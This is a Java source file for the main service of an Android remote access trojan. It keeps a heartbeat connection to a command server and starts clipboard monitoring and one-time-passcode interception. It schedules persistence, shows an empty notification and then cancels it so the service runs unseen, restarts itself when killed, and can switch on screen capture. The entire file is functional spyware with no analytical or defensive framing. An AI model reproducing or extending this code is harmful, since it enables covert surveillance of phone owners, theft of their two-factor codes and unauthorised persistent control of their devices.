package com.wexow.rat.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.wexow.rat.managers.ClipboardMonitor;
import com.wexow.rat.managers.OTPInterceptor;
import com.wexow.rat.managers.ScreenManager;
import com.wexow.rat.stealth.PersistenceManager;

import org.json.JSONObject;

public class MainService extends Service {
    private static final String TAG = "MainService";
    private static final String CHANNEL_ID = "SystemChannel";
    private static final int NOTIF_ID = 1;

    private int currentType = 0;
    private static volatile MainService instance;

    // ⭐ Heartbeat
    private android.os.Handler heartbeatHandler;
    private static final long HEARTBEAT_INTERVAL = 20000;

    public static MainService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.e(TAG, "🚀 MainService onCreate");
        startHeartbeat();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();

        Notification n = buildInvisibleNotification();
        startServiceForeground(n);

        try { ConnectionManager.startAsync(this); }
        catch (Exception e) { Log.e(TAG, "WS start", e); }

        try { ClipboardMonitor.start(this); } catch (Exception ignored) {}
        try { OTPInterceptor.start(this); } catch (Exception ignored) {}
        try { PersistenceManager.scheduleAlarm(this); } catch (Exception ignored) {}

        hideNotification();

        return START_STICKY;
    }

    private Notification buildInvisibleNotification() {
        NotificationCompat.Builder b = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setLocalOnly(true);

        // ⭐⭐⭐ Android 12+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            b.setForegroundServiceBehavior(
                NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE
            );
        }

        return b.build();
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐⭐⭐ WRITE_SECURE_SETTINGS
    // ═══════════════════════════════════════════════════════════
    private void hideNotification() {
        new android.os.Handler(android.os.Looper.getMainLooper())
            .postDelayed(() -> {
                try {
                    NotificationManager nm = (NotificationManager) 
                        getSystemService(NOTIFICATION_SERVICE);
                    if (nm != null) {
                        nm.cancel(NOTIF_ID);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "cancel: " + e.getMessage());
                }

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        NotificationManager nm = (NotificationManager) 
                            getSystemService(NOTIFICATION_SERVICE);
                        
                        NotificationChannel ch = new NotificationChannel(
                            CHANNEL_ID,
                            "System",
                            NotificationManager.IMPORTANCE_NONE 
                        );
                        ch.setShowBadge(false);
                        ch.setSound(null, null);
                        ch.enableLights(false);
                        ch.enableVibration(false);
                        ch.setDescription("");
                        
                        if (nm != null) {
                            nm.createNotificationChannel(ch);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "channel: " + e.getMessage());
                }
            }, 2000);
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐⭐⭐ Heartbeat
    // ═══════════════════════════════════════════════════════════
    private void startHeartbeat() {
        if (heartbeatHandler != null) return;

        heartbeatHandler = new android.os.Handler(android.os.Looper.getMainLooper());
        heartbeatHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ConnectionManager.isConnected()) {
                        JSONObject jo = new JSONObject();
                        jo.put("type", "ping");
                        jo.put("time", System.currentTimeMillis());
                        ConnectionManager.send(jo.toString());
                        Log.e(TAG, "💓 Heartbeat sent");
                    } else {
                        Log.e(TAG, "💔 Not connected");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "❌ heartbeat: " + e.getMessage());
                }

                if (heartbeatHandler != null) {
                    heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL);
                }
            }
        }, HEARTBEAT_INTERVAL);

        Log.e(TAG, "✅ Heartbeat started");
    }

    private void stopHeartbeat() {
        if (heartbeatHandler != null) {
            heartbeatHandler.removeCallbacksAndMessages(null);
            heartbeatHandler = null;
        }
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐ Foreground
    // ═══════════════════════════════════════════════════════════
    private void startServiceForeground(Notification notification) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            currentType = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
            try {
                startForeground(NOTIF_ID, notification, currentType);
                Log.i(TAG, "FGS started (SPECIAL_USE)");
                return;
            } catch (Exception e) {
                Log.e(TAG, "FGS specialUse: " + e.getMessage());
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(NOTIF_ID, notification);
                currentType = 0;
                Log.i(TAG, "FGS started (no type)");
                return;
            } catch (Exception e) {
                Log.e(TAG, "FGS: " + e.getMessage());
            }
        }

        try {
            startForeground(NOTIF_ID, notification);
        } catch (Exception e) {
            Log.e(TAG, "FGS legacy: " + e.getMessage());
        }
    }

    public void upgradeForMediaProjection() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                int newType = currentType | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
                if (newType != currentType) {
                    currentType = newType;
                    startForeground(NOTIF_ID, buildInvisibleNotification(), currentType);
                    Log.e(TAG, "FGS upgraded: " + currentType);
                }
            } catch (Exception e) {
                Log.e(TAG, "upgradeForMediaProjection: " + e.getMessage());
            }
        }
    }

    public void downgradeFromMediaProjection() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return;
        try {
            int newType = currentType & ~ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
            if (newType == 0) newType = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
            if (newType == currentType) return;

            currentType = newType;
            startForeground(NOTIF_ID, buildInvisibleNotification(), currentType);
        } catch (Exception e) {
            Log.e(TAG, "downgrade: " + e.getMessage());
        }
    }

    public void upgradeType(int type) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return;
        try {
            int newType = currentType | type;
            if (newType == currentType) return;
            currentType = newType;
            startForeground(NOTIF_ID, buildInvisibleNotification(), currentType);
        } catch (Exception e) {
            Log.e(TAG, "upgradeType: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID,
                "System",
                NotificationManager.IMPORTANCE_NONE 
            );
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setDescription("");

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            Intent i = new Intent(getApplicationContext(), this.getClass());
            i.setPackage(getPackageName());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        stopHeartbeat();
        instance = null;
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    public static class Restarter extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            try {
                Intent i = new Intent(ctx, MainService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(i);
                } else {
                    ctx.startService(i);
                }
            } catch (Exception ignored) {}
        }
    }
}
